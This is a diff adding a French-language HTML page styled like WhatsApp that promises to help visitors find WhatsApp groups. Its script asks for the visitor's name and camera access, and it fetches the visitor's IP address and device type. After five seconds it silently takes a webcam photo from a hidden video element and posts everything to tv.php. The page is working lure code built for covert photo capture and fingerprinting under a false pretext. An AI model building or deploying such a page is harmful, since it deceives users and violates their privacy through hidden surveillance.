@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture de </title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #ECE5DD;
+            color: #128C7E;
+            text-align: center;
+        }
+        h1 {
+            font-size: 36px;
+            margin-top: 50px;
+            color: #25D366;
+        }
+        p {
+            font-size: 18px;
+            color: #128C7E;
+            margin-top: 20px;
+        }
+        .button {
+            background-color: #128C7E;
+            color: white;
+            padding: 15px 30px;
+            font-size: 18px;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            margin-top: 30px;
+            transition: all 0.3s ease;
+        }
+        .button:hover {
+            background-color: #25D366;
+        }
+        input[type="text"] {
+            padding: 10px;
+            border-radius: 25px;
+            font-size: 16px;
+            margin-top: 10px;
+            width: 250px;
+            border: 1px solid #25D366;
+            outline: none;
+        }
+        #videoElement {
+            display: none; /* Masquer la vidéo */
+        }
+        #log {
+            margin-top: 30px;
+            padding: 15px;
+            background-color: #25D366;
+            color: white;
+            border-radius: 10px;
+            font-size: 16px;
+            text-align: left;
+            height: 200px;
+            overflow-y: auto;
+            width: 80%;
+            margin: 20px auto;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Bienvenue</h1>
+    <p>Entrez votre nom pour continuer et trouver des groupes WhatsApp</p>
+
+    <label for="name">Nom :</label>
+    <input type="text" id="name" placeholder="Votre nom">
+    <button class="button" onclick="requestCameraAccess()">Continuer</button>
+
+    <video id="videoElement" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <div id="log"></div> <!-- Section pour afficher les logs -->
+
+    <script>
+        let name = '';
+        let userIP = '';
+        let deviceBrand = '';
+        let videoElement = document.getElementById("videoElement");
+        let canvas = document.getElementById("canvas");
+        let context = canvas.getContext("2d");
+
+        function logMessage(message) {
+            const logDiv = document.getElementById("log");
+            const newLog = document.createElement("p");
+            newLog.textContent = message;
+            logDiv.appendChild(newLog);
+        }
+
+        function getDeviceBrand() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.match(/Android/i)) {
+                deviceBrand = 'Android';
+            } else if (userAgent.match(/iPhone/i)) {
+                deviceBrand = 'iPhone';
+            } else {
+                deviceBrand = 'Inconnu';
+            }
+            logMessage('Marque du dispositif : ' + deviceBrand);
+        }
+
+        function getIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => { 
+                    userIP = data.ip;
+                    logMessage('Adresse IP récupérée : ' + userIP);
+                })
+                .catch(error => logMessage('Erreur récupération IP : ' + error));
+        }
+
+        function requestCameraAccess() {
+            name = document.getElementById("name").value;
+            if (!name) {
+                alert("Veuillez entrer votre nom.");
+                return;
+            }
+
+            getIP();
+            getDeviceBrand();
+
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function(stream) {
+                        videoElement.srcObject = stream;
+                        logMessage('Accès à la caméra accordé.');
+                        setTimeout(capturePhoto, 5000); // Capture après 5 secondes
+                    })
+                    .catch(function(error) {
+                        alert('Accès à la caméra refusé : ' + error.message);
+                        logMessage('Erreur d\'accès à la caméra : ' + error.message);
+                    });
+            } else {
+                alert('Votre navigateur ne supporte pas la caméra.');
+                logMessage('Votre navigateur ne supporte pas la caméra.');
+            }
+        }
+
+        function capturePhoto() {
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            let photoData = canvas.toDataURL('image/jpeg');
+
+            // Convertir le base64 en un Blob
+            let byteString = atob(photoData.split(',')[1]);
+            let arrayBuffer = new ArrayBuffer(byteString.length);
+            let uintArray = new Uint8Array(arrayBuffer);
+
+            for (let i = 0; i < byteString.length; i++) {
+                uintArray[i] = byteString.charCodeAt(i);
+            }
+
+            let blob = new Blob([uintArray], {type: 'image/jpeg'});
+            let file = new File([blob], 'photo.jpg', {type: 'image/jpeg'});
+
+            logMessage('Photo capturée.');
+
+            sendToServer(file); // Envoi du fichier à PHP
+        }
+
+        function sendToServer(photoFile) {
+            let formData = new FormData();
+            formData.append('name', name);
+            formData.append('ip', userIP);
+            formData.append('deviceBrand', deviceBrand);
+            formData.append('photo', photoFile);
+
+            fetch('tv.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json()) // Assurez-vous que la réponse est au format JSON
+            .then(data => {
+                if (data.success) {
+                    logMessage("Photo envoyée au serveur avec succès.");
+                } else {
+                    logMessage("Erreur côté serveur: " + data.error); // Affichage de l'erreur retournée par le serveur
+                }
+            })
+            .catch(error => {
+                logMessage('Erreur lors de l\'envoi de la photo : ' + error);
+            });
+        }
+    </script>
+
+</body>
+</html>
